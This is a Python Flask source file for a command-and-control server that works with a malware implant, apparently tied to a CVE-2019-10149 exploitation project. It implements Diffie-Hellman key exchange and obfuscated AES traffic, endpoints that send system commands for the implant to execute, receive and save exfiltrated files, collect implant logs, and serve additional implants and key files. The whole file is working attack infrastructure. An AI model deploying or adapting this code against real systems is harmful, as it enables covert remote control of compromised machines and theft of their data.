from flask import Flask, request, jsonify, send_from_directory
import base64
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
import os
import base64
import hashlib
"""
    NOTE 16 Bytes = 128 bits
"""
BLOCK_SIZE = 16

# KEY = "your_secret_key_here"  # Replace with your actual key

key_path = "../key.txt" ## NOTE: Legacy code, likely not needed (see \key endpoint for more details)
server_derived_key = None
first_job = True

## Generates the parameters for Diffe-Hellman Key exhange to be used for the session
def generate_params():
    parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()

    return parameters, private_key, public_key

# def generate_key():
#     key = os.urandom(BLOCK_SIZE)
#     with open(key_path, 'wb') as f:
#         f.write((key))
#     return (key)

## Global key variable for session on C2, gets updated on new Diffe-Hellman Exchange
KEY = None

# function that does AES encryption and then obfuscation
def do_everything(data):
    encrypted_data = aes_encrypt(data, KEY)
    obfuscated_data = obfuscate(encrypted_data)
    return obfuscated_data

# function that does AES decryption and then deobfuscation
def undo_everything(data):
    deobfuscated_data = deobfuscate(data)
    decrypted_data = aes_decrypt(deobfuscated_data, KEY)
    return decrypted_data

## AES Encryption Implementation
def aes_encrypt(plaintext, key):
    key_bytes = hashlib.sha256(key).digest()[:16]
    iv = os.urandom(BLOCK_SIZE)

    # PKCS7 padding
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    return base64.b64encode(iv + encrypted).decode()

## AES Decryption Implementation
def aes_decrypt(ciphertext_b64, key):
    key_bytes = hashlib.sha256(key).digest()[:16]
    raw = base64.b64decode(ciphertext_b64)
    iv = raw[:BLOCK_SIZE]
    encrypted = raw[BLOCK_SIZE:]

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()

    return plaintext.decode()


def obfuscate(text):
    """Obfuscate text by first base64‑encoding it, then splitting into 16‑character chunks,
    padding the last chunk with '@' if needed, and reversing the order of chunks."""
    b64_text = base64.b64encode(text.encode()).decode()
    chunk_size = 16
    chunks = [b64_text[i:i+chunk_size] for i in range(0, len(b64_text), chunk_size)]
    if chunks and len(chunks[-1]) < chunk_size:
        chunks[-1] = chunks[-1].ljust(chunk_size, '@')
    return ''.join(reversed(chunks))

def deobfuscate(obf_str):
    """Reverse the obfuscation: split into 16‑character chunks, reverse order,
    and remove trailing '@' from the final chunk."""
    chunk_size = 16
    chunks = [obf_str[i:i+chunk_size] for i in range(0, len(obf_str), chunk_size)]
    chunks = list(reversed(chunks))
    if chunks:
        chunks[-1] = chunks[-1].rstrip('@')
    ordered_chunks = ''.join(chunks)
    return base64.b64decode(ordered_chunks.encode()).decode()


app = Flask(__name__)
COMMAND_FILE = "command.txt"   ## Command file for implant to parse and execute commands

## define parameters for shared key, have shared bytes to send to implant for implant to derive key
parameters, private_key, public_key = generate_params()

## Use to help implant derive shared key
server_public_bytes = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)


"""
   GET endpoint
   This is how the implant gets the shared parameters the server to derive the session key.
"""
@app.route("/get_key_params", methods=["GET"])
def get_key_params():
    ## Agree on paramaeters for key sharing
    byte_sized_params = parameters.parameter_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.ParameterFormat.PKCS3
    )
    return byte_sized_params

"""
   POST endpoint
   We ensure that the implant and the C2 share the same key for the .
"""
@app.route("/xchg_secrets", methods=["POST"])
def xchg_secrets():
    ## Request client public key to derive server_key for session
    client_public_bytes = request.data
    client_public_key = serialization.load_pem_public_key(
        client_public_bytes,
        backend=default_backend()
    )

    ## Compute and store server_derived_key for commands
    shared_secret = private_key.exchange(client_public_key)
    server_derived_key =  HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'KEYAES',
    ).derive(shared_secret)

    global KEY
    KEY = server_derived_key
    return server_public_bytes


"""
   POST endpoint
   We get uploaded encrypted data from the implant and place the decrypted file on our machine.
"""
@app.route('/upload', methods=['POST'])
def upload():
    # Receive encrypted, obfuscated data from the implant.
    encrypted_data = request.form.get('data')
    if encrypted_data:
        try:
            decrypted_data = undo_everything(encrypted_data)
            print("Received exfiltrated data:")
            decrypted_data = json.loads(decrypted_data)
            print(decrypted_data) # data = { "file_name": os.path.basename(file_path), "file_size": len(file_data), "data": data }
            #save file to receivedFiles folder
            file_data = decrypted_data["data"]
            # this is in string format, so we need to decode it
            file_data = base64.b64decode(file_data)

            file_name = decrypted_data["file_name"]

            file_path = os.path.join("/home/kali/Desktop/receivedFiles/", file_name)

            try:
                with open(file_path, "wb") as f:
                    f.write(file_data)
                    print(f"File saved to {file_path}")
            except Exception as e:
                print(f"Error saving file {file_name}: {e}")

        except Exception as e:
            print("Error processing exfiltrated data:", e)
        return jsonify({"status": "success"}), 200
    else:
        return jsonify({"status": "no data received"}), 400

"""
   GET endpoint
   We use a command file on the attacker machine to send commands to the implant. The implant recieves this file to parse and execute system commands.
"""
@app.route('/command', methods=['GET'])
def get_command():
    try:
        with open(COMMAND_FILE, "r") as f:
            cmd = f.read().strip()
        # Clear the command file immediately after reading.
        with open(COMMAND_FILE, "w") as f:
            f.write("")
        if cmd:
            if cmd == "HELO":
                global first_job
                first_job = True
            secret_cmd = do_everything(cmd)
            return jsonify({"data": secret_cmd}), 200
        else:
            return jsonify({"data": ""}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

"""
    POST endpoint
    The implant sends an encrypted log for the C2 to parse.
"""
@app.route('/log', methods=['POST'])
def log():
    log_data = request.form.get('data')
    if log_data:
        log_data = undo_everything(log_data)
        print(f"Received log : {log_data}")
        return jsonify({"status": "log received"}), 200
    else:
        return jsonify({"status": "no log data received"}), 400

"""
    We can place additional implants or other files from our C2.
"""
@app.route("/utility")
def serve_file():
    return send_from_directory("/home/kali/Desktop/CVE-2019-10149", "utility", as_attachment=True)

"""
    NOTE: Legacy endpoint for testing purposes. This was before Diffe-Hellman implementation. Didn't remove as it can be useful for backup purposes and honestly was too scared if removing it breakings things'
"""
@app.route("/key")
def serve_key():
    return send_from_directory("/home/kali/Desktop/CVE-2019-10149/C2Server", "cur_key.txt", as_attachment=True)

"""
    Helps coordinate multiple running processes and only lets the first process continue
"""
@app.route("/first")
def check_first():
    global first_job
    first_job_cpy = first_job
    first_job = False
    return jsonify(first_job_cpy)

if __name__ == '__main__':
    # Run over HTTPS with cert.pem and key.pem in the same directory.
    app.run(host='0.0.0.0', port=8080, ssl_context=('cert.pem', 'key.pem'), threaded=False)
